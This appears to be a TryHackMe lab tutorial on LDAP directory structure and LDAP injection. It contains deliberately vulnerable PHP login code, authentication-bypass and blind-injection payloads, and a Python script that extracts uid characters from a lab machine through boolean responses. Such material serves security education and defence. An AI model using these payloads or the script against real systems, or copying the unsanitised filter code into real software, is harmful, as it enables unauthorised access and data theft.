# Introduction

LDAP, which stands for Lightweight Directory Access Protocol, is a widely used protocol for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network. LDAP enables organizations to manage users centrally, as well as groups and other directory information, often used for authentication and authorization purposes in web and internal applications.

### Objectives

1. Provide a thorough understanding of LDAP and its role in directory services.
2. Explore the LDAP tree structure and its key components.
3. Introduce LDAP Injection, its impact, and how it can be exploited.
4. Equip participants with the knowledge and skills to identify and mitigate LDAP Injection vulnerabilities.

### Pre-requisites

1. A foundational understanding of how directory services work, particularly LDAP.
2. Basic knowledge of web application security principles and common vulnerabilities.
3. Familiarity with the structure and components of LDAP, such as Distinguished Names (DNs) and attributes.
4. Experience with tools and techniques for security testing of web applications, such as [OWASP ZAP](https://tryhackme.com/room/learnowaspzap) or [Burp Suite](https://tryhackme.com/module/learn-burp-suite).


---

# Structure

In LDAP, directory entries are structured as objects, each adhering to a specific schema that defines the rules and attributes applicable to the object. This object-oriented approach ensures consistency and governs how objects like users or groups can be represented and manipulated within the directory.

**Services that use LDAP**:

- **Microsoft Active Directory:** A service for Windows domain networks, utilizing LDAP as part of its underlying protocol suite to manage domain resources.
- **OpenLDAP:** An open-source implementation of LDAP, widely used for managing user information and supporting authentication mechanisms across various platforms.

### LDIF Format

LDAP entries can be represented using the LDAP Data Interchange Format (LDIF), a standard plain text data format for representing LDAP directory entries and update operations. LDIF imports and exports directory contents and describes directory modifications such as adding, modifying, or deleting entries.

### Structure

An LDAP directory follows a hierarchical structure like a file system's tree. This structure comprises various entries representing a unique item, such as a user, group, or resource.

![LDAP Structure](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f6e0e81b34c5e02559b27b192aba794a.png)

At the top of the LDAP tree, we find the **top-level domain (TLD)**, such as `dc=ldap,dc=thm`. Beneath the TLD, there may be **subdomains** or **organizational units (OUs)**, such as `ou=people` or `ou=groups`, which further categorize the directory entries.

- **Distinguished Names (DNs):** Serve as unique identifiers for each entry in the directory, specifying the path from the top of the LDAP tree to the entry, for example, `cn=John Doe,ou=people,dc=example,dc=com`.
- **Relative Distinguished Names (RDNs):** Represent individual levels within the directory hierarchy, such as `cn=John Doe`, where `cn` stands for Common Name.
- **Attributes:** Define the properties of directory entries, like `mail=john@example.com` for an email address.


---

# Search Queries

LDAP search queries are fundamental in interacting with LDAP directories, allowing you to locate and retrieve information stored within the directory. Understanding how to construct these queries is crucial for effectively utilizing LDAP services.

An LDAP search query consists of several components, each serving a specific function in the search operation:

1. **Base DN (Distinguished Name):** This is the search's starting point in the directory tree.
2. **Scope:** Defines how deep the search should go from the base DN. It can be one of the following:
    - `base` (search the base DN only),
    - `one` (search the immediate children of the base DN),
    - `sub` (search the base DN and all its descendants).
3. **Filter:** A criteria entry must match to be returned in the search results. It uses a specific syntax to define these criteria.
4. **Attributes:** Specifies which characteristics of the matching entries should be returned in the search results.

The basic syntax for an LDAP search query looks like this:

```default
(base DN) (scope) (filter) (attributes)
```

### Filters and Syntax

Filters are the core of LDAP search queries, defining the conditions that entries in the directory must meet to be included in the search results. The syntax for LDAP filters is defined in [RFC 4515](https://www.openldap.org/lists/ietf-ldapbis/200606/msg00010.html), where filters are represented as strings with a specific format, such as `(canonicalName=value)`. LDAP filters can use a variety of operators to refine search criteria, including equality (`=`), presence (`=*`), greater than (`>=`), and less than (`<=`).

One of the most essential operators in LDAP filters is the wildcard `*`, which signifies a match with any number of characters. This operator is crucial for formulating broad or partial-match search conditions.

### Filter Examples

**Simple Filter:**

```default
(cn=John Doe)
```

This filter targets entries with a canonical name (`cn`) exactly matching "John Doe".

**Wildcards:**

```php
(cn=J*)
```

This filter applies the wildcard operator to match any entry where the `cn` begins with "J", regardless of what follows.

**Complex Filters with Logical Operators:**

For a more complex search query, filters can be used with each other using logical operators such as AND (`&`), OR (`|`), and NOT (`!`).

```default
(&(objectClass=user)(|(cn=John*)(cn=Jane*)))
```

This filter searches for entries classified as "user" in their object class with a canonical name starting with either "John" or "Jane".

While not commonly exposed directly, LDAP services can be accessible over the network via ports 389 (for unencrypted or StartTLS connections) and 636 (for SSL/TLS connections). When LDAP services are accessible publicly, tools such as `ldapsearch`, part of the OpenLDAP suite, can be used to interact with the LDAP server. This tool allows a user to query and modify the LDAP directory from the command line, making it a valuable resource for both legitimate administrative tasks and, potentially, for attackers exploiting LDAP Injection vulnerabilities. For example:

##### Sample Search Query using ldapsearch

```

user@tryhackme$ ldapsearch -x -H ldap://MACHINE_IP:389 -b "dc=ldap,dc=thm" "(ou=People)"
# extended LDIF
#
# LDAPv3
# base <dc=ldap,dc=thm> with scope subtree
# filter: (ou=People)
# requesting: ALL
#

# People, ldap.thm
dn: ou=People,dc=ldap,dc=thm
objectClass: organizationalUnit
objectClass: top
ou: People

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
`

This command uses `ldapsearch` to perform a search against an LDAP server located at the vulnerable machine on port 389, starting at the base DN `dc=ldap,dc=thm` and using a filter that will search for entries under the organizational unit of People.


---

# Injection Fundamentals

LDAP Injection is a critical security vulnerability that occurs when user input is not properly sanitized before being incorporated into LDAP queries. This oversight allows attackers to manipulate these queries, leading to unauthorized access or manipulation of the LDAP directory data.

LDAP Injection exploits the way web applications construct LDAP queries. When user input is directly included in these queries without proper validation or encoding, attackers can inject malicious LDAP statements. This can result in unauthorized access to sensitive information, modification of directory data, or bypassing authentication mechanisms.

The process is analogous to SQL Injection, where malicious SQL statements are injected into queries to manipulate database operations. In LDAP Injection, the malicious code targets LDAP queries instead.

### Common Attack Vectors

1. **Authentication Bypass:** Modifying LDAP authentication queries to log in as another user without knowing their password.
2. **Unauthorized Data Access:** Altering LDAP search queries to retrieve sensitive information not intended for the attacker's access.
3. **Data Manipulation:** Injecting queries that modify the LDAP directory, such as adding or modifying user attributes.

### Injection Process

Making an LDAP Injection attack involves several key steps, from identifying the injection point to successfully exploiting the vulnerability.

![LDAP Injection Process](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/5813e9f3ac2fdcc629ec1b047a75cee1.png)  

This diagram illustrates the interaction between the attacker, the web application, and the LDAP server during an LDAP Injection attack. The attacker submits malicious input to the web application login form, which constructs an LDAP query incorporating this input. The LDAP server then executes the altered query, leading to potential unauthorized access or information disclosure, depending on the nature of the injected payload.


---

# Exploiting LDAP

LDAP Injection can be particularly dangerous when exploited within authentication mechanisms. Attackers can manipulate LDAP queries for user authentication to bypass security controls, gaining unauthorised access to applications.

For example, below is a simplified PHP code snippet used in a web application for user authentication against an LDAP server:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost";
$ldap_dn = "ou=People,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm";
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

// LDAP search filter
$filter = "(&(uid=$username)(userPassword=$password))";

// Perform the LDAP search
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

// Check if the search was successful
if ($search_result) {
    // Retrieve the entries from the search result
    $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    $message = "Welcome, " . $entry['cn'][0] . "!\n";
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    $error = "LDAP search failed\n";
}
?>
```

This code is vulnerable because it directly inserts user-supplied input (`$username` and `$password`) into the LDAP query without proper sanitisation or escaping. An attacker can exploit this to inject malicious LDAP filters.

To exploit this vulnerability, an attacker can submit a username with a malicious LDAP filter. For example, the attacker could use a username like `*`, which, when inserted into the LDAP query, effectively turns the query into a condition that always evaluates to true, bypassing authentication.

This query will authenticate successfully if there is any user in the LDAP directory, as the injected condition `uid=*` will always be evaluated to be true.

### Authentication Bypass Techniques

**Tautology-Based Injection**

Tautology-based injection involves inserting conditions into an LDAP query that are inherently true, thus ensuring the query always returns a positive result, irrespective of the intended logic. This method is particularly effective against LDAP queries constructed with user input that is not adequately sanitised. For example, consider an LDAP authentication query where the username and password are inserted directly from user input:

```php
(&(uid={userInput})(userPassword={passwordInput}))
```

An attacker could provide a tautology-based input, such as `*)(|(&` for `{userInput}` and `pwd)` for `{passwordInput}` which transforms the query into:

```php
(&(uid=*)(|(&)(userPassword=pwd)))
```

This query effectively bypasses password checking due to how logical operators are used within the filter. The query consists of two parts, combined using an AND (`&`) operator.

1. `(uid=*)`: This part of the filter matches any entry with a `uid` attribute, essentially all users, because the wildcard `*` matches any value.
    
2. `(|(&)(userPassword=pwd))`: The OR (`|`) operator, meaning that any of the two conditions enclosed needs to be true for the filter to pass. In LDAP, an empty AND (`(&)`) condition is always considered true. The other condition checks if the `userPassword` attribute matches the value `pwd`, which can fail if the user is not using `pwd` as their password.
    

Putting it all together, the second part of the filter `(|(&)(userPassword=pwd))` will always be evaluated as true because of the `(&)` condition. The OR operator only needs one of its enclosed conditions to be true, and since `(&)` is always true, the entire OR condition is true regardless of whether `(userPassword=pwd)` is true or false.

Therefore, this results in a successful query return for any user without verifying the correct password, bypassing the password-checking mechanism.

**Wildcard Injection**

Wildcards (`*`) are used in LDAP queries to match any sequence of characters, making them powerful tools for broad searches. However, when user input containing wildcards is not correctly sanitised, it can lead to unintended query results, such as bypassing authentication by matching multiple or all entries. For example, if the search query is like:

```php
(&(uid={userInput})(userPassword={passwordInput}))
```

An attacker might use a wildcard as input in both uid and userPassword. Using a `*` for `{userInput}` could force the query to ignore specific usernames and focus instead on the password. However, since a wildcard is also present in the `{passwordInput}`, it does not validate the content of the password field against a specific expected value. Instead, it only checks for the presence of the `userPassword` attribute, regardless of its content.

This means that the query will return a positive match for any user without verifying that the password provided during authentication matches the stored password. As a result, this effectively bypasses the password-checking mechanism.

### Authentication Bypass Example

To demonstrate a simple LDAP Injection attack, go to [http://10.10.211.145/normal.php](http://10.10.211.145/normal.php). Based on the code above, the application constructs an LDAP query for authentication based on user input without proper sanitisation.

An attacker can exploit this by submitting a username and password with a character the application does not anticipate, such as an asterisk (*) for the uid and userPassword attribute value. This makes the condition always evaluates to true, effectively bypassing the password check:

**Injected Username and Password:**

```php
username=*&password=*
```

![Injected username and password](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8fc230d9a07a8adaa3fda06498fdf9dd.png)

**Resulting LDAP Query Component:**

```php
(&(uid=*)(userPassword=*))
```

![Resulting LDAP query component](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/20b2a4f30e7b3880a934196393926ed3.png)  

This injection always makes the LDAP query's condition true. However, using just the `*` will always fetch the first result in the query. To target the data beginning in a specific character, an attacker can use a payload like `f*`, which searches for a uid that begins with the letter f.

![Result showing the flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3c98354e63406ae68366efa5d1dcf291.png)



---

# Blind LDAP Injection

Blind LDAP Injection is a more subtle variant of LDAP Injection, where the attacker doesn't receive direct output from the injected payload. Instead, they must infer information based on the application's behaviour. This type of attack is more challenging but can still be used to extract sensitive information from an LDAP directory.

Blind LDAP Injection requires a different approach due to the lack of explicit query results. Attackers must rely on indirect signs, such as changes in application behaviour, error messages, or response timings, to deduce the structure of the LDAP query and the existence of vulnerabilities.

For example, below is the code snippet of [http://MACHINE_IP/blind.php](http://MACHINE_IP/blind.php) that uses an LDAP query to check for the existence of a user but only returns a generic error message on failure. The application also checks if the submitted email is the same as the email in the database:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost"; 
$ldap_dn = "ou=users,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm"; 
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

$filter = "(&(uid=$username)(userPassword=$password))";
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

if ($search_result) {
   $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    if($entry['uid'][0] === $_POST['username']){
                        $message = "Welcome, " . $entry['cn'][0] . "!\n";
                    }else{
                        $message = "Something is wrong in your password.\n";
                    }
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    echo "LDAP search failed\n";
}

ldap_close($ldap_conn);
```

This code is vulnerable to Blind LDAP Injection because it constructs an LDAP filter using unsanitized user input. However, it only provides vague feedback, making it challenging to exploit directly.

To exploit this vulnerability, an attacker can use a technique known as Boolean-based Blind LDAP Injection. The attacker injects conditions into the username field to make the LDAP query true or false, observing the application's behaviour to infer information.

For example, an attacker might try injecting a username like `a*)(|(&`, which, when included in the LDAP query, checks for any user with "a" in their uid exists:

**Injected Username and Password:**

```bash
username=a*%29%28%7C%28%26&password=pwd%29
```

**Note:** The payload above is the URL-encoded version of the payload `a*)(|(&` for username and `pwd)` for password. It must be URL-decoded first before using it.

![Injected username and password](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/053b772823397558933f0b87b9d182ed.png)

**Resulting LDAP Query:**

```bash
(&(uid=a*)(|(&)(userPassword=pwd))) 
```

![resulting LDAP query](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/75795810cd9b19f32d96ff8d445f030b.png)  

If the application returns "Something is wrong in your password", the attacker can infer that a user with an account that starts with "a" in their uid exists in the LDAP directory. To check for the next character, an attacker can reiterate the payload with the next character, for example:

**Injected Username and Password:**

```php
username=ab*%29%28%7C%28%26&password=pwd%29
```

![Second character injected in the payload](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/33cde2b19ebe09a39013ef40d8bf3f85.png)

**Resulting LDAP Query:**

```php
(&(uid=ab*)(|(&)(userPassword=pwd))) 
```

![Resulting LDAP query of the second character](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/32e2c63e294e84663ee560f7cb6e14d5.png)

This indicates that the next character is not "b". An attacker can automate this kind of check by iteratively guessing the characters of the email by observing the web application's behaviour in response to crafted input, similar to a Boolean-based SQL Injection attack.

### Techniques for Extracting Information

1. **Boolean Exploitation:** This involves injecting conditions that are evaluated to be true or false and observing the application's response to infer data. For example, if the application behaves differently when the condition is true, the attacker can deduce that the injected condition matches an existing entry in the LDAP directory.
2. **Error-Based Inference:** In some cases, specific injections might trigger error messages or peculiar application behaviour, providing clues about the LDAP structure or confirming the success of particular payloads.


---

# Automating the Exploitation

### Exploit Code

To automate the exfiltration of data in the previous task, you can use the Python script below:

```python
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://MACHINE_IP/blind.php'

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```

**Click here for a breakdown of the script.**

The above script iteratively guesses the characters of the email by observing the web application's behaviour in response to crafted input.

### Automation

Save the Python code above. If you are using AttackBox, the required Python modules have already been installed. Make sure to use `python3.9` when using the AttackBox since there are multiple Python installations on it.

Below is the sample command on how to run the automation script:

~/Downloads

```
user@tryhackme$ ls script.py user@tryhackme$ python3.9 script.py
```
   
